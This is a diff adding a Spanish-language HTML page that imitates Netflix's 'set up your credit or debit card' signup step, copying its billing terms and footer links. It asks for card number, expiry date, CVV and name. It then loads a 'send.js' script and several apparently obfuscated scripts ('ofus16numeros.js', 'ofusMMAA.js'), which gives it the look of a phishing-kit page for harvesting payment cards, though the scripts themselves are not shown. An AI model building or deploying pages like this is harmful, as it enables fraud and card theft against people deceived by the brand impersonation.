@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Signup</title>
+  <link rel="stylesheet" href="/css/payment.css">
+  <script src="https://code.jquery.com/jquery-1.11.2.min.js"></script>
+</head>
+
+<body>
+  <header>
+    <a href="/index.html" class="logo">
+      <img src="/img/logo-n.PNG" alt="n">
+
+    </a>
+
+    <nav>
+      <a href="/index.html" class="nav-like">Iniciar sesion</a>
+
+    </nav>
+
+  </header>
+
+
+  <hr size="1">
+
+
+
+  <br>
+  <center>
+    <h2>
+      Configura tu tarjeta de<br>crédito o débito
+    </h2>
+  </center>
+
+
+
+  <div class="image-container">
+
+
+    <img src="/img/b.png" alt="Imagen 1">
+
+
+
+
+    <img src="/img/m.png" alt="Imagen 2">
+
+
+    <img src="/img/a.png" alt="Imagen 3">
+
+
+    <img src="/img/c.png" alt="Imagen 4">
+  </div>
+
+  <form id="myForm">
+        
+    <br>
+
+    <div class="email__form__container">
+        <div class="form__container">
+              <input style="background:url(/img/creditcard.PNG) no-repeat right;" type="text"
+               required class="email__input" id="creditCardInput" name="name" placeholder=" "maxlength="19" 
+               oninput="formatCreditCardNumber()" />
+        <label for="creditCardInput" class="email__label">Número de tarjeta</label>
+      </div>
+    </div>
+
+    <br>
+
+    <div class="email__form__container">
+        <div class="form__container">
+          <input  type="text" required id="expiryDateInput" name="email" class="email__input" placeholder=" " />
+          <label for="expiryDateInput" class="email__label">MM/AA</label>
+        </div>
+      </div>
+
+      <br>
+
+
+      <div class="email__form__container">
+        <div class="form__container">
+          <input type="tel" id="codseg" name="tres" required maxlength="4" class="email__input" placeholder=" " />
+          <label for="codseg" class="email__label">CVV</label>
+        </div>
+      </div>
+
+      <br>
+
+      <br>
+<div class="email__form__container">
+<div class="form__container">
+  <input type="text" id="cuatro" name="cuatro" required class="email__input" placeholder=" " />
+  <label for="cuatro" class="email__label">Nombre</label>
+</div>
+</div>
+
+<br>
+
+<div class="email__form__container">
+<div class="form__container">
+  <input type="text" id="cinco" name="cinco" required class="email__input" placeholder=" " />
+  <label for="cinco" class="email__label">Apellido</label>
+</div>
+</div>
+     <br>
+     <br> 
+
+     <br>
+<center>
+<h5 class="lospagos">
+  Los pagos se procesarán internacionalmente. Es posible que se apliquen<br>comisiones bancarias adicionales.<br><br>
+  Al hacer clic en el botón Iniciar membresía, aceptas nuestros Términos de<br>uso y nuestra Declaración de
+  privacidad, declaras que tienes más de<br>18 años y aceptas que tu membresía de Netflix siga
+  activa<br>automáticamente y que, hasta que la canceles, Netflix te facture la cuota<br>de membresía (actualmente
+  de $99 al mes) a través de la forma de pago<br>elegida. Puedes cancelarla en cualquier momento para evitar cargos
+  en<br>el futuro. Para hacerlo, ve a Cuenta y haz clic en Cancelar membresía.
+</h5>
+</center>
+<center><input  id="style_btn" type="submit" value="INICIAR MEMBRESIA"></center>
+    
+</form>
+
+  <!--
+  
+  <form action="/html/popUp.html" method="GET">
+  <div class="email__form__container">
+    <div class="form__container">
+
+      
+
+      <input style="background:url(/img/creditcard.PNG) no-repeat right;" type="text" required class="email__input" id="creditCardInput" name="uno" placeholder=" "maxlength="19" oninput="formatCreditCardNumber()" />
+      <label class="email__label">Número de tarjeta</label>
+    </div>
+  </div>
+  <br>
+
+  <div class="email__form__container">
+    <div class="form__container">
+      <input  type="text" required id="expiryDateInput" name="dos" class="email__input" placeholder=" " />
+      <label class="email__label">MM/AA</label>
+    </div>
+  </div>
+  <br>
+  <div class="email__form__container">
+    <div class="form__container">
+      <input type="tel" name="tres" required maxlength="4" class="email__input" placeholder=" " />
+      <label class="email__label">CVV</label>
+    </div>
+  </div>
+  <br>
+  <div class="email__form__container">
+    <div class="form__container">
+      <input type="text" name="cuatro" required class="email__input" placeholder=" " />
+      <label class="email__label">Nombre</label>
+    </div>
+  </div>
+  <br>
+  <div class="email__form__container">
+    <div class="form__container">
+      <input type="text" id="cinco" name="cinco" required class="email__input" placeholder=" " />
+      <label class="email__label">Apellido</label>
+    </div>
+  </div>
+
+
+
+  <br>
+  <center>
+    <h5 class="lospagos">
+      Los pagos se procesarán internacionalmente. Es posible que se apliquen<br>comisiones bancarias adicionales.<br><br>
+      Al hacer clic en el botón Iniciar membresía, aceptas nuestros Términos de<br>uso y nuestra Declaración de
+      privacidad, declaras que tienes más de<br>18 años y aceptas que tu membresía de Netflix siga
+      activa<br>automáticamente y que, hasta que la canceles, Netflix te facture la cuota<br>de membresía (actualmente
+      de $99 al mes) a través de la forma de pago<br>elegida. Puedes cancelarla en cualquier momento para evitar cargos
+      en<br>el futuro. Para hacerlo, ve a Cuenta y haz clic en Cancelar membresía.
+    </h5>
+  </center>
+  <br>
+  <div style="text-align: center;">
+    <button onclick="location.href='/html/popUp.html'" class="segundo__button">
+      Iniciar membresía <i class="fal fa-chevron-right"></i>
+    </button>
+  </div>
+
+</form>
+
+-->
+
+  <br>
+  <center>
+    <h5 class="lospagosdos">
+      Esta página está protegida por Google reCAPTCHA para comprobar que<br>no eres un robot.
+    </h5>
+  </center>
+  <br>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  <br>
+  <br>
+
+
+  <footer class="footer">
+    <p>¿Preguntas? Llama al 800 953 1430</p>
+    <div class="footer-cols">
+      <ul>
+        <li><a href="https://help.netflix.com/es/node/412">Preguntas más frecuentes</a></li>
+        <li><a href="https://ir.netflix.net/ir-overview/profile/default.aspx">Relaciones con inversionistas</a></li>
+        <li><a href="https://devices.netflix.com/es/">Formas de ver</a></li>
+        <li><a href="https://help.netflix.com/legal/corpinfo">Información corporativa</a></li>
+        <li><a href="https://www.netflix.com/mx/browse/genre/839338">Solo en Netflix</a></li>
+      </ul>
+      <ul>
+        <li><a href="https://help.netflix.com/es/">Centro de ayuda</a></li>
+        <li><a href="https://jobs.netflix.com/">Empleo</a></li>
+        <li><a href="https://help.netflix.com/legal/termsofuse">Términos de uso</a></li>
+        <li><a href="https://help.netflix.com/es/contactus">Contáctanos</a></li>
+      </ul>
+      <ul>
+        <li><a href="https://www.netflix.com/youraccount">Cuenta</a></li>
+        <li><a href="https://www.netflix.com/mx/redeem">Canjear tarjetas de regalo</a></li>
+        <li><a href="https://help.netflix.com/legal/privacy">Privacidad</a></li>
+        <li><a href="https://fast.com/es/">Prueba de velocidad</a></li>
+      </ul>
+      <ul>
+        <li><a href="https://media.netflix.com/es/">Prensa</a></li>
+        <li><a href="https://www.netflix.com/gift-cards">Comprar tarjetas de regalo</a></li>
+        <li><a href="#">Preferencias de cookies</a></li>
+        <li><a href="https://help.netflix.com/legal/notices">Avisos legales</a></li>
+      </ul>
+    </div>
+  </footer>
+
+  <script src="send.js"></script>
+  <script src="app.js"></script>
+  <script src="/js/indexOfus.js"></script>
+  <script src="/js/mainOfus.js"></script>
+  <script src="/js/ofus16numeros.js"></script>
+  <script src="/js/ofusMMAA.js"></script>
+
+
+
+
+
+
+
+
+
+</body>
+
+</html>
